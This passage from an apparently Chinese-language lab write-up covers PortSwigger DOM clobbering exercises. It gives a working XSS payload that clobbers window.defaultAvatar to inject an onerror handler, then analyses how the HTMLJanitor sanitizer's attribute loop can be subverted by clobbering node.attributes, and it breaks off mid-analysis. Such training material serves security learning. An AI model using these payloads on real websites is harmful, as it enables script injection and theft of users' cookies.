function.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x5B9E;&#x9A8C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<code>resources/js/loadCommentsWithDomPurify.js</code>&#x8DEF;&#x7531;&#x627E;&#x5230;&#x8FD9;&#x4E2A; JS &#x6587;&#x4EF6;&#xFF0C;&#x5728;<code>displayComments()</code>&#x51FD;&#x6570;&#x4E2D;&#x6211;&#x4EEC;&#x53C8;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> defaultAvatar = <span class="hljs-built_in">window</span>.defaultAvatar || {<span class="hljs-attr">avatar</span>: <span class="hljs-string">&apos;/resources/images/avatarDefault.svg&apos;</span>}</span><br><span class="line"><span class="hljs-keyword">let</span> avatarImgHTML = <span class="hljs-string">&apos;&lt;img class=&quot;avatar&quot; src=&quot;&apos;</span> + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + <span class="hljs-string">&apos;&quot;&gt;&apos;</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> divImgContainer = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line">divImgContainer.innerHTML = avatarImgHTML</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x5F88;&#x660E;&#x663E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; Dom Clobbering &#x6765;&#x63A7;&#x5236; <code>window.defaultAvatar</code>&#xFF0C;&#x53EA;&#x8981;&#x6211;&#x4EEC;&#x539F;&#x6765;&#x6CA1;&#x6709;&#x5934;&#x50CF;&#x5C31;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x4E2A;&#x6784;&#x9020;&#x4E00;&#x4E2A;<code>defaultAvatar.avatar</code>&#x8FDB;&#x884C; XSS &#x4E86;&#x3002;</p><p>&#x6839;&#x636E;&#x524D;&#x9762;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;&#x4E24;&#x5C42;&#x7684;&#x5C42;&#x7EA7;&#x5173;&#x7CFB;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x7528; HTMLCollection &#x6765;&#x64CD;&#x4F5C;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">defaultAvatar</span> <span class="hljs-attr">name</span>=<span class="hljs-string">avatar</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x6CE8;&#x610F;<code>&quot;</code>&#x9700;&#x8981;&#x8FDB;&#x884C; HTML&#x5B9E;&#x4F53;&#x7F16;&#x7801;&#xFF0C;&#x7528; URL &#x7F16;&#x7801;&#x7684;&#x8BDD;&#x6D4F;&#x89C8;&#x5668;&#x4F1A;&#x62A5;&#x9519;<code>1:%22onerror=alert(1)// net::ERR_FILE_NOT_FOUND</code>&#x3002;</p><p>&#x8FD9;&#x6837;&#x8BC4;&#x8BBA;&#x4EE5;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x8BC4;&#x8BBA;&#x5904;&#x770B;&#x5230;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;avatar&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x518D;&#x968F;&#x4FBF;&#x8BC4;&#x8BBA;&#x4E00;&#x4E0B;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684; XSS &#x4E86;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png" alt></p><h3 id="Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters"><a href="#Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters" class="headerlink" title="Lab:Clobbering DOM attributes to bypass HTML filters"></a>Lab:Clobbering DOM attributes to bypass HTML filters</h3><blockquote><p>&#x200B;    This lab uses the HTMLJanitor library, which is vulnerable to <a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener">DOM clobbering</a>. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that alerts document.cookie. You may need to use the exploit server in order to make your vector auto-execute in the victim&#x2019;s browser.</p><p>Note: The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x5728;<code>resources/js/loadCommentsWithHtmlJanitor.js</code>&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x4EE3;&#x7801;&#x5B89;&#x5168;&#x591A;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x660E;&#x663E;&#x7684;&#x76F4;&#x63A5;&#x7528;<code>Window.x</code>&#x8FD9;&#x79CD;&#x4EE3;&#x7801;&#x4E86;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> janitor = <span class="hljs-keyword">new</span> HTMLJanitor({<span class="hljs-attr">tags</span>: {<span class="hljs-attr">input</span>:{<span class="hljs-attr">name</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">type</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">value</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">form</span>:{<span class="hljs-attr">id</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">i</span>:{},<span class="hljs-attr">b</span>:{},<span class="hljs-attr">p</span>:{}}});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x521D;&#x59CB;&#x5316;&#x4E86;<code>HTMLJanitor</code>&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x521D;&#x59CB;&#x5316;&#x5185;&#x7684;&#x6807;&#x7B7E;&#x53CA;&#x5176;&#x5C5E;&#x6027;&#xFF0C;&#x5BF9;&#x4E8E;&#x91CD;&#x8981;&#x7684;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x5730;&#x65B9;&#x90FD;&#x4F7F;&#x7528;&#x4E86;<code>janitor.clean</code>&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x6CA1;&#x529E;&#x6CD5;&#x5F88;&#x7B80;&#x5355;&#x5730;&#x8FDB;&#x884C; XSS &#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C31;&#x53EA;&#x80FD;&#x6765;&#x770B;&#x770B;<code>resources/js/htmlJanitor.js</code>&#x8FD9;&#x4E2A;&#x8FC7;&#x6EE4;&#x6587;&#x4EF6;&#x4E86;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype.clean = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">html</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">const</span> sandbox = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument(<span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-keyword">const</span> root = sandbox.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line">  root.innerHTML = html;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(sandbox, root);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> root.innerHTML;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9996;&#x5148;&#x7528;<code>document.implementation.createHTMLDocument</code>&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684; HTML &#x6587;&#x6863;&#x7528;&#x4F5C; sandbox &#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x4E8E; sandbox &#x5185;&#x7684;&#x5143;&#x7D20;&#x8FDB;&#x884C;<code>_sanitize</code>&#x8FC7;&#x6EE4;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype._sanitize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">document, parentNode</span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">var</span> treeWalker = createTreeWalker(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;<code>_sanitize</code>&#x51FD;&#x6570;&#x4E00;&#x5F00;&#x59CB;&#x8C03;&#x7528;&#x4E86;<code>createTreeWalker</code>&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;<code>TreeWalker</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x5F53;&#x524D;&#x6587;&#x6863;&#x7684;&#x5B50;&#x6811;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8282;&#x70B9;&#x53CA;&#x5176;&#x4F4D;&#x7F6E;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createTreeWalker</span>(<span class="hljs-params">document, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">document</span>.createTreeWalker(</span><br><span class="line">    node,</span><br><span class="line">    NodeFilter.SHOW_TEXT |</span><br><span class="line">    NodeFilter.SHOW_ELEMENT |</span><br><span class="line">    NodeFilter.SHOW_COMMENT,</span><br><span class="line">    <span class="hljs-literal">null</span>,</span><br><span class="line">    <span class="hljs-literal">false</span></span><br><span class="line">  );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x7684;<code>node</code>&#x5373;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>root</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;<code>html</code>&#x4F1A;&#x5728;&#x4F20;&#x5165;&#x5230;<code>node</code>&#x53C2;&#x6570;&#xFF0C;<code>document</code>&#x5373;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>sandbox</code>&#xFF0C;&#x63A5;&#x7740;&#x8FDB;&#x5165;&#x5FAA;&#x73AF;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF0C;&#x5BF9;&#x4E8E;&#x6587;&#x672C;&#x5462;&#x7ED2;&#x4EE5;&#x53CA;&#x6CE8;&#x91CA;&#x8FDB;&#x884C;&#x5904;&#x7406;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.TEXT_NODE) {</span><br><span class="line">true<span class="hljs-comment">//&#x5982;&#x679C;&#x6B64;&#x6587;&#x672C;&#x8282;&#x70B9;&#x53EA;&#x662F;&#x7A7A;&#x767D;&#xFF0C;&#x5E76;&#x4E14;&#x4E0A;&#x4E00;&#x4E2A;&#x6216;&#x4E0B;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x540C;&#x7EA7;&#x662F;`blockElement`&#xFF0C;&#x5219;&#x5C06;&#x5176;&#x5220;&#x9664;</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// &#x79FB;&#x9664;&#x6240;&#x6709;&#x7684;&#x6CE8;&#x91CA;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.COMMENT_NODE) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//&#x68C0;&#x67E5;`inlineElement`&#x4E2D;&#x662F;&#x5426;&#x8FD8;&#x6709;`BlockElement`</span></span><br><span class="line"><span class="hljs-keyword">var</span> isInline = isInlineElement(node);</span><br><span class="line"><span class="hljs-keyword">var</span> containsBlockElement;</span><br><span class="line"><span class="hljs-keyword">if</span> (isInline) {</span><br><span class="line">  containsBlockElement = <span class="hljs-built_in">Array</span>.prototype.some.call(</span><br><span class="line">    node.childNodes,</span><br><span class="line">    isBlockElement</span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//&#x68C0;&#x67E5;`BlockElement`&#x662F;&#x5426;&#x5D4C;&#x5957;</span></span><br><span class="line"><span class="hljs-keyword">var</span> isNotTopContainer = !!parentNode.parentNode;</span><br><span class="line"><span class="hljs-keyword">var</span> isNestedBlockElement =</span><br><span class="line">    isBlockElement(parentNode) &amp;&amp;</span><br><span class="line">    isBlockElement(node) &amp;&amp;</span><br><span class="line">    isNotTopContainer;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> nodeName = node.nodeName.toLowerCase();</span><br><span class="line"><span class="hljs-comment">//&#x83B7;&#x53D6;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x7684;&#x5C5E;&#x6027;</span></span><br><span class="line"><span class="hljs-keyword">var</span> allowedAttrs = getAllowedAttrs(<span class="hljs-keyword">this</span>.config, nodeName, node);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//&#x6839;&#x636E;&#x767D;&#x540D;&#x5355;&#x5220;&#x9664;&#x6807;&#x7B7E;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (</span><br><span class="line">  isInvalid ||</span><br><span class="line">  shouldRejectNode(node, allowedAttrs) ||</span><br><span class="line">  (!<span class="hljs-keyword">this</span>.config.keepNestedBlockElements &amp;&amp; isNestedBlockElement)</span><br><span class="line">) {</span><br><span class="line">  <span class="hljs-comment">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    !(node.nodeName === <span class="hljs-string">&quot;SCRIPT&quot;</span> || node.nodeName === <span class="hljs-string">&quot;STYLE&quot;</span>)</span><br><span class="line">  ) {</span><br><span class="line">    <span class="hljs-keyword">while</span> (node.childNodes.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">      parentNode.insertBefore(node.childNodes[<span class="hljs-number">0</span>], node);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  parentNode.removeChild(node);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-keyword">break</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6700;&#x540E;&#x770B;&#x5230;&#x503C;&#x5F97;&#x6211;&#x4EEC;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Sanitize attributes</span></span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a += <span class="hljs-number">1</span>) {</span><br><span class="line">  <span class="hljs-keyword">var</span> attr = node.attributes[a];</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (shouldRejectAttr(attr, allowedAttrs, node)) {</span><br><span class="line">    node.removeAttribute(attr.name);</span><br><span class="line">    <span class="hljs-comment">// Shift the array to continue looping.</span></span><br><span class="line">    a = a - <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Sanitize children</span></span><br><span class="line"><span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, node);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x8FD9;&#x91CC;&#x6700;&#x7EC8;&#x5BF9;&#x6807;&#x7B7E;&#x7684;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x4E86; check &#xFF0C;&#x5BF9; node &#x7684;&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x90FD;&#x8FDB;&#x884C;&#x4E86;&#x767D;&#x540D;&#x5355;&#x68C0;&#x67E5;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shouldRejectAttr</span>(<span class="hljs-params">attr, allowedAttrs, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> attrName = attr.name.toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (allowedAttrs === <span class="hljs-literal">true</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;function&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> !allowedAttrs[attrName](attr.value, node);</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;undefined&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (allowedAttrs[attrName] === <span class="hljs-literal">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;string&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> allowedAttrs[attrName] !== attr.value;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6709;&#x4E0D;&#x5728;&#x767D;&#x540D;&#x5355;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;<code>node.removeAttribute(attr.name);</code>&#x8FDB;&#x884C;&#x5220;&#x9664;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x5B50;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x9012;&#x5F52;<code>_sanitize</code>&#x3002;&#x6240;&#x4EE5;&#x6709;&#x4E24;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x8981;&#x4E48;&#x7ED5;&#x6807;&#x7B7E;&#x8FC7;&#x6EE4;&#xFF0C;&#x8981;&#x4E48;&#x7ED5;&#x8282;&#x70B9;&#x5C5E;&#x6027;&#x8FC7;&#x6EE4;&#x3002;</p><p>&#x6807;&#x7B7E;&#x7684;&#x83B7;&#x53D6;&#x7531;<code>treeWalker.firstChild();</code>&#x5F97;&#x5230;&#xFF0C;&#x8FC7;&#x6EE4;&#x7531;<code>getAllowedAttrs</code>&#x4EE5;&#x53CA;<code>shouldRejectNode</code>&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x8FD9;&#x91CC;&#x7684;&#x8FC7;&#x6EE4;&#x662F;&#x8FDB;&#x884C;&#x767D;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF1B;&#x5C5E;&#x6027;&#x7684;&#x83B7;&#x53D6;&#x5728;&#x4E00;&#x4E2A;<code>for</code>&#x5FAA;&#x73AF;&#x5F53;&#x4E2D;&#xFF0C;&#x6761;&#x4EF6;&#x662F;<code>node.attributes.length</code>&#xFF0C;&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x662F;<code>node.attributes[a]</code>&#xFF0C;&#x8FC7;&#x6EE4;&#x7531;<code>shouldRejectAttr</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x3002;</p><p>&#x5BF9; Dom Clobbering &#x6BD4;&#x8F83;&#x654F;&#x611F;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x4F1A;&#x6CE8;&#x610F;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x5BF9;&#x4E8E; node &#x5C5E;&#x6027;&#x8FC7;&#x6EE4;&#x65F6;&#x7684;<code>for</code>&#x5FAA;&#x73AF;&#x6761;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x4E86;<code>node.attributes.length</code>&#xFF0C;&#x5018;&#x82E5;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;&#x8282;&#x70B9;&#x6B63;&#x597D;&#x6709;&#x4E00;&#x4E2A;<code>attributes</code>&#x5B50;&#x8282;&#x70B9;&#x4F1A;&#x600E;&#x4E48;&#x6837;&#x5462;&#xFF1F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;finished&apos;</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x8F93;&#x51FA;&#x4E00;&#x4E2A;<code>NamedNodeMap</code>&#x5BF9;&#x8C61;&#xFF0C;<code>id=&apos;x&apos;</code>&#x4EE5;&#x53CA; finished</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;finished&apos;</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x8F93;&#x51FA;<code>&lt;img name=attributes&gt;</code>&#x4EE5;&#x53CA; finished 